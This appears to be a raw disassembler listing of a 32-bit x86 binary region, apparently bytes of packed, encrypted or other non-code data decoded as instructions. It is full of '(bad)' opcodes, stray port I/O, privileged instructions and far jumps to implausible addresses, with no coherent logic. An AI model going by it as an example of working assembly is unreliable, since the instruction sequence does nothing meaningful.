  40dfb8:	cmp    edi,DWORD PTR [eax+0x2a]
  40dfbb:	adc    al,bh
  40dfbd:	repnz out dx,eax
  40dfbf:	stos   BYTE PTR es:[edi],al
  40dfc0:	adc    edx,ebp
  40dfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfc3:	cmc    
  40dfc4:	jns    0x40dfff
  40dfc6:	fild   DWORD PTR [eax-0x4e6abbac]
  40dfcc:	inc    esp
  40dfce:	test   al,0x7b
  40dfd0:	(bad)  
  40dfd1:	sub    dl,BYTE PTR [esi]
  40dfd3:	and    BYTE PTR [ebx],ch
  40dfd5:	loope  0x40df7c
  40dfd7:	out    dx,al
  40dfd8:	stos   DWORD PTR es:[edi],eax
  40dfd9:	pop    esp
  40dfda:	sbb    al,0xbf
  40dfdc:	push   esi
  40dfdd:	dec    ebx
  40dfde:	fs add edx,edx
  40dfe1:	mov    cl,0xde
  40dfe3:	or     DWORD PTR [edx+edi*8+0x22406580],0xfffffff3
  40dfeb:	ds pop edx
  40dfed:	push   0x1dca7569
  40dff2:	mov    bl,0x19
  40dff4:	fwait
  40dff5:	arpl   WORD PTR [esi-0x3f1e47ef],cx
  40dffb:	push   edx
  40dffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dffd:	mov    bl,0x5
  40dfff:	add    ah,BYTE PTR gs:0x24a9406f
  40e006:	sbb    ah,dh
  40e008:	arpl   bp,bx
  40e00a:	dec    ebp
  40e00b:	fst    DWORD PTR [eax+0x60]
  40e00e:	push   eax
  40e00f:	aad    0x80
  40e011:	mov    al,BYTE PTR [edx*1-0x45301bd0]
  40e018:	or     dl,BYTE PTR [eax+0x64ee0047]
  40e01e:	sbb    ebp,DWORD PTR [ecx]
  40e020:	mov    cl,0xdb
  40e022:	push   ebx
  40e023:	enter  0x8f9f,0xe9
  40e027:	push   esi
  40e028:	sub    eax,0x25c2789f
  40e02d:	sbb    BYTE PTR [edi+0x2],dh
  40e030:	dec    edx
  40e031:	push   ds
  40e032:	retf   0xd5e7
  40e035:	and    DWORD PTR [edx+0x4d58a063],0x70
  40e03c:	test   DWORD PTR [ecx-0x57],0x5cde818a
  40e043:	adc    edx,DWORD PTR [eax]
  40e045:	and    al,0x6c
  40e047:	je     0x40e000
  40e049:	sub    BYTE PTR [ebp-0x6b],ch
  40e04c:	sub    DWORD PTR [ebp-0x5be358b],eax
  40e052:	jp     0x40e066
  40e054:	je     0x40dfee
  40e056:	test   eax,0x2638d77e
  40e05b:	or     al,BYTE PTR [ebx+0x4a]
  40e05e:	jp     0x40e026
  40e060:	popf   
  40e061:	popa   
  40e062:	add    al,0x7e
  40e064:	adc    BYTE PTR [eax+0x39fa8759],ch
  40e06a:	mov    ds:0xc5d2e228,eax
  40e06f:	mov    ebx,DWORD PTR [esp+edi*4+0x70]
  40e073:	add    edi,ecx
  40e075:	repz sub BYTE PTR [edi+0x2a],dl
  40e079:	xor    al,0x9b
  40e07b:	dec    ebp
  40e07c:	mov    dh,0xc6
  40e07f:	sbb    BYTE PTR [edi],bl
  40e081:	pop    ds
  40e082:	out    0x6d,eax
  40e084:	outs   dx,DWORD PTR ds:[esi]
  40e085:	jge    0x40e0b2
  40e087:	sar    DWORD PTR [ebx],0x7d
  40e08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e08b:	mov    ecx,gs
  40e08d:	mov    ah,0xb7
  40e08f:	cmp    BYTE PTR [ecx+0x72],dh
  40e092:	cdq    
  40e093:	dec    ebx
  40e094:	xchg   edi,eax
  40e095:	(bad)  
  40e096:	mov    eax,0x89cbb170
  40e09b:	push   ebx
  40e09c:	fistp  DWORD PTR [esi+edi*4-0x4e]
  40e0a0:	(bad)  
  40e0a1:	cli    
  40e0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a3:	in     al,0xd2
  40e0a5:	push   ebp
  40e0a6:	fsubr  DWORD PTR [edi+eax*1+0x24]
  40e0aa:	std    
  40e0ab:	inc    eax
  40e0ac:	sbb    DWORD PTR [ebx],ebx
  40e0ae:	std    
  40e0af:	jge    0x40e04b
  40e0b1:	sub    DWORD PTR [eax+eax*8+0x19063150],eax
  40e0b8:	inc    ebx
  40e0b9:	adc    al,BYTE PTR [edx]
  40e0bb:	push   ecx
  40e0bc:	dec    esi
  40e0bd:	jge    0x40e0ef
  40e0bf:	dec    esp
  40e0c0:	rcr    al,0x5
  40e0c3:	mov    esp,0x3b677bec
  40e0c8:	xor    bl,ch
  40e0ca:	sub    al,0x74
  40e0cc:	pushf  
  40e0cd:	mov    ebp,0x523a8724
  40e0d2:	fild   DWORD PTR [eax+0x528ea44c]
  40e0d8:	(bad)  
  40e0d9:	jae    0x40e110
  40e0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0dc:	ror    BYTE PTR [ebx+0x12],0xf5
  40e0e0:	sub    BYTE PTR [esi+0x2fa472c9],bl
  40e0e6:	cwde   
  40e0e7:	xchg   ecx,eax
  40e0e8:	repnz cmp DWORD PTR [ebx-0x351bbc42],ecx
  40e0ef:	add    al,0x60
  40e0f1:	mov    ecx,0xa7a5d66e
  40e0f6:	outs   dx,DWORD PTR ds:[esi]
  40e0f7:	scas   eax,DWORD PTR es:[edi]
  40e0f8:	(bad)  
  40e0f9:	loop   0x40e08f
  40e0fb:	popa   
  40e0fc:	jmp    0x5ed5cd7c
  40e101:	cmp    al,0x1d
  40e103:	retf   
  40e104:	fnstenv [ecx]
  40e106:	in     al,dx
  40e107:	fimul  DWORD PTR [ecx]
  40e109:	sub    al,0x33
  40e10b:	add    bl,ch
  40e10d:	push   es
  40e10e:	mov    WORD PTR [esi+0x47bb309],es
  40e114:	mov    esi,0xa9451317
  40e119:	ffree  st(0)
  40e11b:	add    dh,BYTE PTR gs:[ecx+0x1c]
  40e11f:	(bad)  
  40e120:	dec    esp
  40e121:	mov    ds:0x550b5a77,eax
  40e126:	adc    ah,ah
  40e128:	mov    dh,0xb7
  40e12a:	frstor [eax]
  40e12c:	add    BYTE PTR [ecx],cl
  40e12e:	in     al,0xf4
  40e130:	jg     0x40e129
  40e132:	inc    ebp
  40e133:	push   edx
  40e134:	push   es
  40e135:	nop
  40e136:	(bad)  
  40e137:	jnp    0x40e170
  40e139:	add    al,0x9b
  40e13b:	adc    bh,BYTE PTR [eax]
  40e13d:	fcom   QWORD PTR [eax+0xfdae441]
  40e143:	xchg   edx,eax
  40e144:	jmp    0x40e18a
  40e146:	push   edi
  40e147:	inc    ebp
  40e148:	mov    eax,0x48a28b5e
  40e14d:	xor    DWORD PTR [eax+0x24b7b89b],eax
  40e153:	mov    eax,ds:0x6b518fe9
  40e158:	dec    edi
  40e159:	push   edx
  40e15a:	pop    edx
  40e15b:	lods   eax,DWORD PTR ds:[esi]
  40e15c:	xor    cl,dh
  40e15e:	push   ds
  40e15f:	cmp    BYTE PTR [eax+0x52],0x9
  40e163:	cmp    edi,DWORD PTR ds:0x2861ddf8
  40e169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e16a:	stos   BYTE PTR es:[edi],al
  40e16b:	cwde   
  40e16c:	jecxz  0x40e175
  40e16e:	push   0xffffff82
  40e170:	mov    BYTE PTR [ecx+0x3c],cl
  40e173:	and    bh,BYTE PTR [edi+ecx*4]
  40e176:	fsub   DWORD PTR [ecx-0x58]
  40e179:	mov    esi,0xab5411e7
  40e17e:	cli    
  40e17f:	push   ds
  40e180:	adc    BYTE PTR [esp+esi*4-0x2127494a],0xdc
  40e188:	in     al,0x5c
  40e18a:	dec    esi
  40e18b:	push   ebp
  40e18c:	stos   BYTE PTR es:[edi],al
  40e18d:	push   esp
  40e18e:	sub    cl,BYTE PTR [esp+ecx*2+0x4e]
  40e192:	lock xchg BYTE PTR [edi+0x66d6f896],al
  40e199:	xor    DWORD PTR [ecx-0x3475654f],0x20
  40e1a0:	pusha  
  40e1a1:	jne    0x40e218
  40e1a3:	adc    DWORD PTR [edi-0x3436c5a2],0x27
  40e1aa:	xchg   esi,eax
  40e1ab:	jns    0x40e18e
  40e1ad:	clc    
  40e1ae:	pop    ecx
  40e1af:	mov    esi,0x6b2ae4f6
  40e1b4:	jmp    0x40e1db
  40e1b6:	ss mov dh,0xc7
  40e1b9:	and    BYTE PTR [esi+0x414d285],bl
  40e1bf:	dec    ebp
  40e1c0:	test   al,0xf8
  40e1c2:	mov    al,al
  40e1c4:	inc    ebp
  40e1c5:	mov    ds:0x55274291,al
  40e1ca:	and    eax,0x44c9aed0
  40e1cf:	ret    
  40e1d0:	ja     0x40e173
  40e1d2:	and    ebx,DWORD PTR [ebp-0x54e1098e]
  40e1d8:	add    al,0x5b
  40e1da:	add    al,0xa1
  40e1dc:	and    DWORD PTR [ebp-0x62ac3edd],edi
  40e1e2:	pop    ecx
  40e1e3:	iret   
  40e1e4:	mov    ebp,0x24921d40
  40e1e9:	push   ds
  40e1ea:	mov    eax,edx
  40e1ec:	test   BYTE PTR [edi*1+0x4a1534cb],ch
  40e1f3:	xor    al,BYTE PTR [ecx+0x4a]
  40e1f6:	sub    DWORD PTR [ebx],esi
  40e1f8:	push   eax
  40e1f9:	cmp    ecx,ecx
  40e1fb:	ds inc ebx
  40e1fd:	add    al,dl
  40e1ff:	sbb    cl,ch
  40e201:	in     al,dx
  40e202:	arpl   WORD PTR [ecx],di
  40e204:	shl    DWORD PTR [ebx+0x46],0xd
  40e208:	mov    al,0xdd
  40e20a:	out    0xa8,eax
  40e20c:	adc    eax,0x10ecdc66
  40e211:	push   ss
  40e212:	sub    al,0x65
  40e214:	and    esi,DWORD PTR ds:[ecx-0x54abe32d]
  40e21b:	add    ah,BYTE PTR es:0xaf11070c
  40e222:	mov    ebp,0xc56a8c67
  40e227:	arpl   WORD PTR ds:0x974ea2ca,di
  40e22d:	or     DWORD PTR [eax+0x59828038],ebx
  40e233:	mov    al,0xcb
  40e235:	shl    BYTE PTR [esi-0xf],0xd
  40e239:	outs   dx,DWORD PTR ds:[esi]
  40e23a:	ins    DWORD PTR es:[edi],dx
  40e23b:	fisttp DWORD PTR ds:0xe10b6802
  40e241:	xor    DWORD PTR [eax],ebx
  40e243:	hlt    
  40e244:	push   ebp
  40e245:	aam    0x53
  40e247:	leave  
  40e248:	je     0x40e2c0
  40e24a:	push   ds
  40e24b:	bound  ebp,QWORD PTR [ebx]
  40e24d:	dec    esi
  40e24e:	(bad)  
  40e250:	imul   esp,DWORD PTR [esi-0x107adfb4],0x8b01b93b
  40e25a:	lods   al,BYTE PTR ds:[esi]
  40e25b:	stc    
  40e25c:	xlat   BYTE PTR ds:[ebx]
  40e25d:	inc    edx
  40e25e:	add    eax,0x35172d3b
  40e263:	pop    ss
  40e264:	jne    0x40e2de
  40e266:	mov    esi,0x9f9cce9a
  40e26b:	sub    BYTE PTR [ebp+ebx*4+0xe],dh
  40e26f:	inc    eax
  40e270:	dec    edx
  40e271:	dec    ecx
  40e272:	dec    ecx
  40e273:	xchg   esi,eax
  40e274:	cmp    ah,cl
  40e276:	aaa    
  40e277:	adc    DWORD PTR [esi-0x13],ebx
  40e27a:	push   ecx
  40e27b:	xchg   edx,eax
  40e27c:	push   ebp
  40e27d:	les    esp,FWORD PTR [eax-0x3949b3b4]
  40e283:	fwait
  40e284:	and    DWORD PTR [edx-0x80],esp
  40e287:	cmp    BYTE PTR [edx+0x3cac7190],cl
  40e28d:	push   cs
  40e28e:	sahf   
  40e28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e290:	push   0xf
  40e292:	and    al,0x89
  40e294:	lods   eax,DWORD PTR ds:[esi]
  40e295:	and    cx,WORD PTR [ebp+0x1f]
  40e299:	cwde   
  40e29a:	(bad)  [eax-0x112f7be8]
  40e2a0:	leave  
  40e2a1:	shr    ch,0x37
  40e2a4:	ins    DWORD PTR es:[edi],dx
  40e2a5:	pop    edi
  40e2a6:	mov    eax,0xcb02fe78
  40e2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2ac:	iret   
  40e2ad:	add    al,ah
  40e2af:	pop    es
  40e2b0:	add    DWORD PTR [ebp-0xe4e66b6],edx
  40e2b6:	jno    0x40e29e
  40e2b8:	out    0x66,al
  40e2ba:	jns    0x40e299
  40e2bc:	jmp    0x40e2ac
  40e2be:	jecxz  0x40e2dd
  40e2c0:	out    dx,eax
  40e2c1:	jl     0x40e2db
  40e2c3:	fs dec esp
  40e2c5:	mov    bh,0xd7
  40e2c7:	out    0xec,al
  40e2c9:	(bad)  [ebx-0x64]
  40e2cc:	cmp    BYTE PTR [ecx-0x6a],dh
  40e2cf:	scas   eax,DWORD PTR es:[edi]
  40e2d0:	cmp    eax,0x9ea78e71
  40e2d5:	pop    ebp
  40e2d6:	out    0xdc,al
  40e2d8:	stc    
  40e2d9:	mov    BYTE PTR [ebx],ch
  40e2db:	sbb    ecx,DWORD PTR ds:0xb2a4cec2
  40e2e1:	daa    
  40e2e2:	xchg   esp,eax
  40e2e3:	mov    eax,es:0x854a0bc
  40e2e9:	add    DWORD PTR [esi+0x9],0x4335881d
  40e2f0:	mov    al,0x5e
  40e2f2:	or     ch,bh
  40e2f4:	je     0x40e2b8
  40e2f6:	ja     0x40e296
  40e2f8:	xor    al,0x7d
  40e2fa:	dec    edi
  40e2fb:	cmc    
  40e2fc:	loopne 0x40e350
  40e2fe:	jmp    0x40e2dc
  40e300:	jns    0x40e2b7
  40e302:	inc    eax
  40e303:	out    0x6,eax
  40e305:	rol    BYTE PTR [ebx],0x3d
  40e308:	daa    
  40e309:	and    BYTE PTR [ecx],dh
  40e30b:	rcr    BYTE PTR [esi+eiz*1+0x2a],1
  40e30f:	sbb    eax,0xc61c1597
  40e314:	test   al,0x27
  40e316:	shl    ecx,cl
  40e318:	and    eax,0xe386dd84
  40e31d:	jp     0x40e2d5
  40e31f:	jmp    0xc4dd:0x69321dbd
  40e326:	adc    DWORD PTR ds:0x48e81ec1,edx
  40e32c:	je     0x40e2f1
  40e32e:	and    al,0x4
  40e330:	(bad)  
  40e331:	and    edx,DWORD PTR [esi+ebx*2+0x7725974c]
  40e338:	out    0xba,al
  40e33a:	fdiv   st,st(7)
  40e33c:	mov    ch,0xb9
  40e33e:	push   cs
  40e33f:	aad    0x77
  40e341:	mov    ebx,esp
  40e343:	nop
  40e344:	leave  
  40e345:	mov    DWORD PTR [edx+0x66],edi
  40e348:	data16 ins BYTE PTR es:[edi],dx
  40e34a:	adc    DWORD PTR [edx-0xb],edi
  40e34d:	cmp    al,0x8f
  40e34f:	push   eax
  40e350:	pop    ss
  40e351:	mov    ds:0x1ff3b5c9,al
  40e356:	sti    
  40e357:	fadd   st,st(7)
  40e359:	or     cl,BYTE PTR [ebx]
  40e35b:	add    eax,0x2bb6eade
  40e360:	add    al,0x20
  40e362:	test   al,dl
  40e364:	dec    ecx
  40e365:	xor    al,0xc
  40e367:	push   ecx
  40e368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e369:	cmp    ebp,ebp
  40e36b:	aaa    
  40e36c:	shl    BYTE PTR [ecx],cl
  40e36e:	aam    0xe9
  40e370:	neg    DWORD PTR [edi]
  40e372:	jne    0x40e36f
  40e374:	in     eax,dx
  40e375:	adc    al,0xaf
  40e377:	jg     0x40e356
  40e379:	pop    es
  40e37a:	enter  0x579d,0xe4
  40e37e:	and    DWORD PTR [eax],ebp
  40e380:	bound  edx,QWORD PTR [edx]
  40e382:	out    dx,al
  40e383:	mov    cl,0x52
  40e385:	dec    edx
  40e386:	push   0xffffffcd
  40e388:	es xchg ebp,eax
  40e38a:	push   0x55
  40e38c:	gs stos BYTE PTR es:[edi],al
  40e38e:	lea    esp,[edx]
  40e390:	push   es
  40e391:	std    
  40e392:	ds push ecx
  40e394:	sbb    al,0xdb
  40e396:	inc    ecx
  40e397:	imul   esp,DWORD PTR [esi-0x52],0xffffffe1
  40e39b:	adc    ah,BYTE PTR [edi-0x676c7202]
  40e3a1:	pusha  
  40e3a2:	pop    eax
  40e3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3a4:	adc    al,0x56
  40e3a6:	je     0x40e366
  40e3a8:	sti    
  40e3a9:	sub    BYTE PTR ds:0x11f7f97f,bl
  40e3af:	push   0xffffffa0
  40e3b1:	test   BYTE PTR [ecx-0x5c],dl
  40e3b4:	hlt    
  40e3b5:	aas    
  40e3b6:	sub    DWORD PTR [ebp-0x39db8e0f],ebp
  40e3bc:	inc    ecx
  40e3bd:	xor    eax,DWORD PTR ds:0x52d34de5
  40e3c3:	and    al,0x7f
  40e3c5:	pushf  
  40e3c6:	push   eax
  40e3c7:	jno    0x40e3d4
  40e3c9:	adc    eax,0x2e5ca7df
  40e3ce:	arpl   WORD PTR [edx+0x3dbbf4f6],si
  40e3d4:	fcmovu st,st(3)
  40e3d6:	sub    eax,0x833e9ece
  40e3db:	adc    dl,al
  40e3dd:	mov    edx,0x2e2ef726
  40e3e2:	xor    dh,BYTE PTR ds:0xdfc3c935
  40e3e8:	repnz out 0x79,eax
  40e3eb:	(bad)  
  40e3ec:	sti    
  40e3ed:	(bad)  
  40e3ef:	jo     0x40e3c1
  40e3f1:	gs jae 0x40e3a7
  40e3f4:	lds    ecx,FWORD PTR [ebx+0x2f]
  40e3f7:	lahf   
  40e3f8:	loope  0x40e3f3
  40e3fa:	mov    ds:0xc5e17917,eax
  40e3ff:	adc    eax,0x32f4bf8e
  40e404:	pop    ss
  40e405:	cs (bad) 
  40e407:	fldz   
  40e409:	out    dx,eax
  40e40a:	and    DWORD PTR [edx-0x7f28efb5],ecx
  40e410:	or     DWORD PTR [eax],ecx
  40e412:	test   BYTE PTR [eax+0x10],0x80
  40e416:	sbb    BYTE PTR [eax],al
  40e418:	add    edx,DWORD PTR [edi+edx*8-0x388efc5f]
  40e41f:	cmp    al,0x30
  40e421:	sbb    BYTE PTR [edi],bh
  40e423:	mov    edi,0x2f6e4944
  40e428:	popf   
  40e429:	aad    0x57
  40e42b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e42c:	push   ss
  40e42d:	test   al,0x70
  40e42f:	imul   ebx,edi,0x2224cfba
  40e435:	int    0x8
  40e437:	sub    al,0x13
  40e439:	shl    DWORD PTR gs:[edi+0x24],0x7f
  40e43e:	stos   BYTE PTR es:[edi],al
  40e43f:	jae    0x40e3fc
  40e441:	dec    esp
  40e442:	add    BYTE PTR [ebx+0x3cfd5d30],cl
  40e448:	inc    ebx
  40e449:	push   esp
  40e44a:	and    dh,BYTE PTR [ebp-0x411727fb]
  40e450:	or     al,0xf1
  40e452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e453:	cmp    bl,BYTE PTR [ebx-0x1db924b7]
  40e459:	dec    esp
  40e45a:	sub    al,0x12
  40e45c:	out    dx,al
  40e45d:	cmc    
  40e45e:	mov    WORD PTR [edx-0x2b44dd1c],cs
  40e464:	mov    al,0x99
  40e466:	and    al,0x1e
  40e468:	xor    cl,BYTE PTR [ecx+0x66357a8]
  40e46e:	and    ecx,0xffffff8e
  40e471:	and    BYTE PTR [eax+ecx*1],0x82
  40e475:	imul   esp,DWORD PTR [ebp+0x3],0xffffffbe
  40e479:	push   esp
  40e47a:	js     0x40e44e
  40e47c:	ins    DWORD PTR es:[edi],dx
  40e47d:	push   0x381d3537
  40e482:	popf   
  40e483:	or     DWORD PTR [eax+0x7c],ebx
  40e486:	pushf  
  40e487:	cmp    edi,0x120e5100
  40e48d:	sbb    DWORD PTR [edx],esp
  40e48f:	sub    al,0x22
  40e491:	pop    esp
  40e492:	idiv   DWORD PTR [esi]
  40e494:	out    dx,al
  40e495:	mov    esi,0xa8df113c
  40e49a:	xor    DWORD PTR [eax-0xc],esi
  40e49d:	mov    ecx,0x894b2f4
  40e4a2:	dec    edi
  40e4a3:	stc    
  40e4a4:	lock dec ebx
  40e4a6:	push   edx
  40e4a7:	push   edx
  40e4a8:	test   eax,0xad2501d7
  40e4ad:	cmc    
  40e4ae:	inc    ebp
  40e4af:	lock jne 0x40e498
  40e4b2:	(bad)  
  40e4b3:	shl    DWORD PTR [eax+0x40],0xac
  40e4b7:	shl    DWORD PTR [ecx-0x67],cl
  40e4ba:	sti    
  40e4bb:	test   ecx,edx
  40e4bd:	shl    BYTE PTR [ecx+0x6f7abb32],1
  40e4c3:	data16 js 0x40e49f
  40e4c6:	ss or  al,0x43
  40e4c9:	dec    edx
  40e4ca:	inc    ecx
  40e4cb:	pusha  
  40e4cc:	pop    es
  40e4cd:	mov    cl,0xd0
  40e4cf:	xchg   edx,eax
  40e4d0:	pop    edi
  40e4d1:	jmp    0x83d4:0x4cf730e7
  40e4d8:	push   0xffffffe3
  40e4da:	jne    0x40e4f2
  40e4dc:	adc    eax,0x1d4ff2a5
  40e4e1:	sub    esi,DWORD PTR ds:0x8f3cf704
  40e4e7:	push   edx
  40e4e8:	mov    ecx,0x512a504c
  40e4ed:	test   eax,0x4938854
  40e4f2:	sbb    edi,eax
  40e4f4:	je     0x40e4d1
  40e4f6:	ins    DWORD PTR es:[edi],dx
  40e4f7:	pop    esi
  40e4f8:	cmp    bh,BYTE PTR [esi-0x24]
  40e4fb:	mov    edx,0x2ad5aa9d
  40e500:	aad    0x6a
  40e502:	xchg   ebp,eax
  40e503:	out    0xf8,al
  40e505:	sbb    ch,cl
  40e507:	inc    esi
  40e508:	xor    DWORD PTR [edi+0x7d],0xffffffeb
  40e50c:	mov    ebp,0x3a6df3bc
  40e511:	sub    DWORD PTR [ebp-0x42829f21],eax
  40e517:	retf   
  40e518:	jbe    0x40e545
  40e51a:	out    0xea,al
  40e51c:	pop    edx
  40e51d:	(bad)  
  40e51e:	retf   
  40e51f:	scas   eax,DWORD PTR es:[edi]
  40e520:	lods   al,BYTE PTR ds:[esi]
  40e521:	jb     0x40e51f
  40e523:	in     eax,0xd3
  40e525:	mov    esp,0xc5cbaa7c
  40e52a:	sub    ecx,DWORD PTR ds:0x854576a2
  40e530:	add    BYTE PTR [edi-0x7b4d5e59],dl
  40e536:	xor    eax,0xef2b1200
  40e53b:	sbb    DWORD PTR [eax+ebp*1],0xffffffc6
  40e53f:	nop
  40e540:	hlt    
  40e541:	push   eax
  40e542:	inc    esi
  40e543:	aas    
  40e544:	ins    DWORD PTR es:[edi],dx
  40e545:	dec    edi
  40e546:	xor    BYTE PTR [esi],dh
  40e548:	test   DWORD PTR [edx*4-0x665bc04],eax
  40e54f:	repz pop edx
  40e551:	cmovg  edi,DWORD PTR [eiz*4-0x20b747fe]
  40e559:	hlt    
  40e55a:	test   eax,0x9e50c35a
  40e55f:	mov    eax,DWORD PTR [esi]
  40e561:	xchg   esp,eax
  40e562:	mov    edx,0x52679b9f
  40e567:	pusha  
  40e568:	rcl    DWORD PTR [edi-0x33],1
  40e56b:	mov    eax,0x827b5d2e
  40e570:	ret    
  40e571:	cmp    al,0x2c
  40e573:	popa   
  40e574:	cmp    edi,DWORD PTR ds:0x3e61909c
  40e57a:	out    0x50,al
  40e57c:	(bad)  
  40e57d:	mov    edx,0x89884ca3
  40e582:	retf   0xd50a
  40e585:	push   0x1e1c8e08
  40e58a:	sbb    esi,DWORD PTR [ecx+0x1]
  40e58d:	mov    edx,0x7df7d3e3
  40e592:	fwait
  40e593:	jp     0x40e542
  40e595:	mov    al,ds:0xf1b45cbd
  40e59a:	jbe    0x40e550
  40e59c:	fwait
  40e59d:	dec    edx
  40e59e:	or     BYTE PTR [edx+0x238d66fe],dl
  40e5a4:	mov    ds:0x68a21f70,eax
  40e5a9:	pop    eax
  40e5aa:	test   al,0x2
  40e5ac:	in     al,dx
  40e5ad:	adc    al,0xe5
  40e5af:	out    0xc6,eax
  40e5b1:	adc    al,al
  40e5b3:	into   
  40e5b4:	or     al,0xe1
  40e5b6:	jp     0x40e622
  40e5b8:	inc    eax
  40e5b9:	sahf   
  40e5ba:	adc    DWORD PTR [eax*1+0x2ab90a],edx
  40e5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c2:	xor    BYTE PTR [eax+0x68],dl
  40e5c5:	dec    ecx
  40e5c6:	pop    ebx
  40e5c7:	or     eax,0xa6a7c602
  40e5cc:	adc    al,0x8c
  40e5ce:	xlat   BYTE PTR ds:[ebx]
  40e5cf:	shl    BYTE PTR [esi-0x7aed1229],cl
  40e5d5:	and    DWORD PTR [ecx+0x18],esp
  40e5d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d9:	out    0xbb,eax
  40e5db:	pop    ds
  40e5dc:	fucomp st(5)
  40e5de:	and    eax,0x22893dbd
  40e5e3:	and    ch,BYTE PTR [ebp+0x4]
  40e5e6:	adc    bh,BYTE PTR [ecx+0x2a8e9167]
  40e5ec:	lea    ecx,fs:[eax+0x62c65842]
  40e5f3:	mov    cs,WORD PTR [ebp-0x64]
  40e5f6:	imul   ebx,DWORD PTR [edx+0x7d38c30c],0xffffffe9
  40e5fd:	and    ch,BYTE PTR [ebx]
  40e5ff:	loope  0x40e5fc
  40e601:	mov    al,cl
  40e603:	xchg   ebp,eax
  40e604:	retf   
  40e605:	inc    esp
  40e606:	push   ecx
  40e607:	inc    esp
  40e608:	mov    edi,0xebd7a7df
  40e60d:	rcl    ebx,1
  40e60f:	imul   eax,eax,0xcd3c35cc
  40e615:	add    al,0x1b
  40e617:	lea    ebx,[edx]
  40e619:	jecxz  0x40e5fe
  40e61b:	jecxz  0x40e609
  40e61d:	fnstsw WORD PTR [ebx]
  40e61f:	iret   
  40e620:	jge    0x40e619
  40e622:	dec    esp
  40e623:	repz fstp QWORD PTR [edi]
  40e626:	mov    edx,0xb413df07
  40e62b:	cmp    eax,DWORD PTR [ebx]
  40e62d:	pop    esi
  40e62e:	ds jno 0x40e5c2
  40e631:	out    0x8f,eax
  40e633:	scas   al,BYTE PTR es:[edi]
  40e634:	jo     0x40e62a
  40e636:	fcom   DWORD PTR [ebp-0x62]
  40e639:	jp     0x40e639
  40e63b:	sbb    al,0x27
  40e63d:	dec    edi
  40e63e:	or     DWORD PTR [edx],edi
  40e640:	in     eax,dx
  40e641:	push   es
  40e642:	inc    esp
  40e643:	xor    eax,0x6543cea8
  40e648:	sbb    al,BYTE PTR [edx-0x2bcaabee]
  40e64e:	(bad)  
  40e64f:	cmp    cl,dl
  40e651:	sti    
  40e652:	adc    BYTE PTR [edi+0x52112fd4],dh
  40e658:	(bad)  
  40e659:	ss jmp 0x40e60a
  40e65c:	adc    al,0xc6
  40e65e:	push   ebp
  40e65f:	sub    al,0xc0
  40e661:	dec    edi
  40e662:	adc    al,bh
  40e664:	or     BYTE PTR [ebx],dl
  40e666:	jno    0x40e64f
  40e668:	inc    edx
  40e669:	jle    0x40e6d2
  40e66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e66c:	jmp    0x2ca4bcbf
  40e671:	addr16 mov al,ds:0xdcb3
  40e675:	inc    ebx
  40e676:	adc    ebp,DWORD PTR [edi+0x1dc22830]
  40e67c:	pop    esp
  40e67d:	jmp    0x7bd8:0x42f9993f
  40e684:	gs or  eax,0xa34a8e7d
  40e68a:	aad    0x89
  40e68c:	and    bh,BYTE PTR [esi+0x428066a2]
  40e692:	sbb    al,0x9
  40e694:	jmp    0x4510:0x6c5a584d
  40e69b:	popf   
  40e69c:	sbb    eax,0xfbef9dc7
  40e6a1:	mov    ah,0xdb
  40e6a3:	ins    DWORD PTR es:[edi],dx
  40e6a4:	mov    ds:0x184ca28,al
  40e6a9:	jmp    0x40e68e
  40e6ab:	into   
  40e6ac:	(bad)  
  40e6ad:	fsubrp st(1),st
  40e6af:	div    BYTE PTR [ebx+ebx*4-0x3ce5fc8e]
  40e6b6:	fidiv  WORD PTR [ebp+0x6b2ade5a]
  40e6bc:	fcomp  QWORD PTR [ebp-0x53]
  40e6bf:	push   esi
  40e6c0:	retf   
  40e6c1:	fiadd  DWORD PTR [eax]
  40e6c3:	repnz sbb DWORD PTR [ebx-0x76],edx
  40e6c7:	or     al,bl
  40e6c9:	mov    eax,0xf37dcd00
  40e6ce:	push   ds
  40e6cf:	test   BYTE PTR [ebp+0x116b8254],bl
  40e6d5:	jle    0x40e668
  40e6d7:	popf   
  40e6d8:	rcr    ebp,0xf
  40e6db:	sub    DWORD PTR [ebx+0x18],esi
  40e6de:	push   cs
  40e6df:	xchg   DWORD PTR [eax],ecx
  40e6e1:	iret   
  40e6e2:	and    ecx,DWORD PTR [eax]
  40e6e4:	add    al,BYTE PTR [edi+ebp*8-0x52c2cecd]
  40e6eb:	dec    edx
  40e6ec:	xchg   DWORD PTR ds:0x479ef887,ecx
  40e6f2:	mov    bh,0xdb
  40e6f4:	gs fsubr st,st(7)
  40e6f7:	adc    eax,DWORD PTR [edi+0x11]
  40e6fa:	mov    eax,ds:0x145a584e
  40e6ff:	jmp    0x40e6d1
  40e701:	jmp    0x40e779
  40e703:	or     DWORD PTR [ebx+0x25],ecx
  40e706:	add    ch,BYTE PTR [ebp+0x7f]
  40e709:	lock xor eax,0x6652291
  40e70f:	xor    eax,0x66994328
  40e714:	add    dl,dl
  40e716:	sbb    esp,esp
  40e718:	cli    
  40e719:	cmp    BYTE PTR [ebx],ah
  40e71b:	stc    
  40e71c:	int    0x7b
  40e71e:	fdiv   DWORD PTR [ebx+eiz*8-0x1a]
  40e722:	das    
  40e723:	mov    bh,0xdf
  40e725:	dec    ebp
  40e726:	add    BYTE PTR [edx-0x2dca3ad0],0x96
  40e72d:	and    al,0x9
  40e72f:	fcmovnu st,st(3)
  40e731:	ins    DWORD PTR es:[edi],dx
  40e732:	mov    dh,0xb6
  40e734:	pop    edx
  40e735:	pushf  
  40e736:	cmp    DWORD PTR [ebx-0x2a],esi
